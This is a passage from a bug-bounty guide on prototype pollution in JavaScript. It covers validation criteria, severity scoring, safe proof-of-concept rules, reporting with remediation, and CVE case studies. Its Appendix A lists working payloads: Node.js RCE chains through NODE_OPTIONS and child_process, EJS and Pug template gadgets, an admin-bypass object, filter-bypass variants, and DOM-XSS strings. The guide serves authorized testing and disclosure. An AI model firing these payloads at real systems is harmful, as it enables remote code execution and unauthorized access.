| App reflects `__proto__` in a response | Reflection ≠ pollution | A **fresh** object has the property (`({}).x`) / an SSPP oracle flips |
| `?__proto__[x]=y` returns 200 | No effect shown | `Object.prototype.x==='y'` in console, or the SSPP oracle changes |
| `Object.prototype.x` set but nothing happens | Source only, no gadget | A **gadget** turning it into XSS/RCE/authz — or a concrete property-injection impact |
| SSPP oracle blipped once | Could be caching/jitter | **Repeatable** oracle change vs a clean baseline (re-test 3×) |
| A library "has a known gadget" | The target may not load it / not reach the sink | You actually **trigger** the sink (XSS fires / command runs) |
| Client pollution via `location.hash` only affects your own tab | Self-XSS unless deliverable | A URL/param an attacker can send that pollutes the **victim's** context |
| Vulnerable lib version present | Presence ≠ reachable | The vulnerable operation is on an attacker-reachable input path |

**Golden rule:** a prototype-pollution *finding* needs a demonstrated **global pollution** (fresh objects carry it / SSPP oracle flips) **plus** a concrete impact (a fired gadget, executed command, admin access, or injected response). A set property with no consequence is a *primitive*, not a bug — keep hunting the gadget.

## 7.2 Severity calibration (CVSS + CWE)

| Scenario | Severity | Example CVSS 3.1 | CWE |
|----------|----------|------------------|-----|
| Server-side pollution → **RCE** (gadget fired) | **Critical (9.8)** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` | CWE-1321 → CWE-94/78 |
| Prototype pollution → **auth/privilege bypass** (`isAdmin`) | **Critical/High (8.1–9.8)** | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` | CWE-1321 → CWE-287/269 |
| Client-side pollution → **DOM-XSS** (fired) | **High (8.2)** | `AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N` | CWE-1321 → CWE-79 |
| SSPP property-injection → CORS/redirect/cache abuse | **High/Medium (6.1–7.5)** | context-dependent | CWE-1321 |
| Confirmed global pollution, gadget plausible but unfired | **Medium (5.3)** | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` | CWE-1321 |
| Source only, no global effect proven | **Low/Info** | — | CWE-1321 |
| Pollution → DoS (destructive) | **Medium/High** (report carefully) | `AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` | CWE-1321 → CWE-400 |

## 7.3 SAFE-PoC discipline (prototype pollution is dangerous — read this)

> **In plain words:** here's the danger that makes this bug different from most. You're not editing *your own* copy of anything — you're scribbling in the **one shared handbook the entire server reads**, and your scribble stays there until someone restarts the app. That means your `isAdmin:true` or a broken setting hits *every other user and every other request*, not just your test. So treat it like a live grenade: prove the primitive with a **harmless marker** (`json spaces`, a random nonce property), never scribble something that breaks the app for everyone on production, fire **one** benign command for RCE then stop, and tell the program the pollution needs a **restart** to clear. On the client it's tamer (your own tab), but still deliver PoCs only to your own test victim.

- **Server-side pollution is process-global and persists until the app restarts.** It affects **all users and all requests**, not just yours. Treat it like a live grenade:
  - Use **benign markers** (`json spaces`, a unique nonce property) to prove the primitive — not properties that alter security state for other users.
  - **Never** pollute a property that breaks the app for everyone (DoS) on production; demonstrate DoS only on your own instance.
  - For **auth-bypass** (`isAdmin`), prove it against **your own** session/test account and understand it may briefly affect others — coordinate/limit, prefer a lab if the target is shared prod.
  - For **RCE**, one benign command (`id` / OOB callback) then STOP; don't pollute repeatedly.
  - Note in the report that the pollution needs an app **restart** to clear, and flag that to the program.
- **Client-side:** use an `alert(document.domain)` or benign OOB beacon; deliver via a URL to **your own** test victim; don't weaponise.
- Redact any real tokens; tear down OOB servers; don't leave the prototype polluted longer than needed to prove it.

## 7.4 Reporting

Lead with **Source + Gadget + Impact**. Show: the exact pollution request (JSON/URL), the **proof of global pollution** (fresh-object property or the SSPP oracle diff), and the **gadget firing** (XSS alert / executed command / admin access). Name the vulnerable operation (`_.merge`/`$.extend(true)`/`_.set`) and the fix (below). Use the report template. Cite CWE-1321 and the library CVE if it's a known-vulnerable dependency.

**Remediation to recommend (so the report is actionable):** validate/deny the keys `__proto__`, `constructor`, `prototype` at input boundaries; parse JSON with a reviver that drops them; use `Object.create(null)` / `Map` for merge targets; use `Object.freeze(Object.prototype)` **at boot** (before any merge); prefer merge libraries patched against PP (current lodash) and non-recursive assigns; run Node with `--disable-proto=delete`; add a schema (JSON Schema/`ajv` with `additionalProperties:false`).

---

# PART VIII — Real-world case studies & CVE deep-dives (know these cold)

- **Kibana — CVE-2019-7609 (Timelion → RCE).** User-supplied Timelion expression polluted the prototype; the reporting/canvas worker spawned a Node child process reading polluted options → RCE as `kibana`. The reference proof that server-side PP is real RCE.
- **lodash — CVE-2019-10744 (`defaultsDeep`).** `_.defaultsDeep({}, JSON.parse('{"__proto__":{"a":1}}'))` polluted `Object.prototype` — one of the most widely-depended-upon vulnerable operations ever; also CVE-2018-3721/16487 for `merge`/`set`.
- **jQuery — CVE-2019-11358 (`$.extend(true, …)`).** `$.extend(true, {}, JSON.parse('{"__proto__":{"x":1}}'))` polluted the prototype in millions of pages; fixed in 3.4.0.
- **minimist — CVE-2020-7598** and **yargs-parser — CVE-2020-7608.** argv parsers polluting via `--__proto__.x=y` — the CLI/CI/desktop vector.
- **Silent Spring (USENIX 2023).** Systematic discovery that pollution of `NODE_OPTIONS`/`--require`/`shell`/`env` options turns *any* later `child_process` spawn into RCE — the modern, reliable server-side chain in §3.1.

---

# Appendix A — Gadget quick-reference (grab-and-go)

```jsonc
// SSPP detection oracles (benign):
{"__proto__":{"json spaces":10}}                 // Express indentation flip (best)
{"__proto__":{"status":510}}                     // status override
{"__proto__":{"exposedHeaders":["x8bit"]}}       // CORS header appears
{"__proto__":{"content-type":"text/html; charset=x8bit"}}

// Auth bypass (gadget-free — try first):
{"__proto__":{"isAdmin":true,"role":"admin","isAuthenticated":true}}

// RCE — child_process (Silent Spring):
{"__proto__":{"env":{"EVIL":"console.log(require('child_process').execSync('id').toString())//"},"NODE_OPTIONS":"--require /proc/self/environ","argv0":"node"}}
{"__proto__":{"NODE_OPTIONS":"--require=/tmp/evil.js","shell":"node"}}

// RCE — template engines:
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');var y"}}   // EJS
{"__proto__":{"compileDebug":true,"self":true,"line":"process.mainModule.require('child_process').execSync('id')"}}   // Pug

// Filter bypass (block __proto__):
{"constructor":{"prototype":{"x":"y"}}}
constructor[prototype][x]=y
__pro__proto__to__[x]=y                           // strip-once reassembly

// Client-side DOM-XSS gadgets:
?__proto__[html]=<img src=x onerror=alert(document.domain)>
?__proto__[src]=data:,alert(document.domain)
#__proto__[srcdoc]=<script>alert(1)</script>      // hash vector (no server hit)
```

# Appendix B — Vulnerable-library → CVE → gadget map

| Library (vulnerable range) | CVE | Vector | Escalation |
|---|---|---|---|
| lodash `<4.17.12` (`merge`/`defaultsDeep`/`set`) | CVE-2019-10744, 2018-3721/16487 | `_.merge`/`_.defaultsDeep`/`_.set` of JSON | → any gadget |
| jQuery `<3.4.0` (`$.extend(true)`) | CVE-2019-11358 | `$.extend(true,{},userJSON)` | → client gadget / DOM-XSS |
| minimist `<1.2.3` | CVE-2020-7598 | `--__proto__.x=y` argv | → CLI/desktop RCE |
| yargs-parser `<13.1.2/15.0.1/18.1.1` | CVE-2020-7608 | argv | → CLI RCE |
| Kibana Timelion | CVE-2019-7609 | expression → merge | → `child_process` RCE |
| set-value / merge / deep-set / dot-prop (old) | multiple | path-set of `__proto__.x` | → any gadget |

# Appendix C — References & further reading

**Always-on core:**
- **PortSwigger Web Security Academy** — Prototype pollution (client **and** server labs) · **PortSwigger Research** (Gareth Heyes) — client-side "widespread prototype pollution gadgets" (2020) + server-side PP detection & gadgets (2022–2023) + **DOM Invader** tooling.
- **HackTricks** — Prototype Pollution (client + NodeJS) · **The Hacker Recipes** — Prototype pollution.
- **PayloadsAllTheThings** — Prototype Pollution · **OWASP** — Prototype-Pollution-Prevention Cheat Sheet.

**Class-defining research (read these):**
- **Olivier Arteau** — "Prototype pollution attacks in NodeJS applications" (NorthSec 2018) — the origin.
- **Mikhail Shcherbakov, Musard Balliu, et al.** — "Silent Spring: Prototype Pollution Leads to RCE in Node.js" (USENIX Security 2023) — the systematic `NODE_OPTIONS`/`--require` server-side-RCE research (matches §3.1).
- **Michał Bentkowski (Securitum)** — client-side PP + sanitiser/**DOMPurify**-config gadgets & mXSS write-ups.
- **s1r1us** — prototype-pollution-to-RCE write-ups (Blitz.js / Electron / etc.) · **BlackFan (Sergey Bobrov)** — the *client-side-prototype-pollution* gadgets collection.

**CVEs & real-world:** lodash CVE-2019-10744 / 2018-3721 / 2018-16487 · jQuery CVE-2019-11358 · minimist CVE-2020-7598 · yargs-parser CVE-2020-7608 · Kibana CVE-2019-7609 · numerous HackerOne PP→RCE reports.

**Standards & scoring:** CWE-1321 (→ CWE-94/78 RCE · CWE-79 DOM-XSS · CWE-287/269 authz bypass) · CVSS 3.1 calculator (first.org/cvss/calculator/3.1).

---

## Companion files
- **[Attack Arsenal](#/prototype/arsenal)** — payloads + full gadget catalogue + tools.
- **[Testing Checklist](#/prototype/checklist)** — phase-by-phase + auto-reject.
- **the report template** — report skeleton.
- **[Zero to Expert (Q&A)](#/prototype/qa)** — Q&A study + field reference.
- **[PoC Scripts](#/prototype/poc)** — `pp_probe.py` (SSPP oracle detector, control-baselined) · `pp_payloads.py` (payload-matrix generator) · `gadgets_cheat.md`.
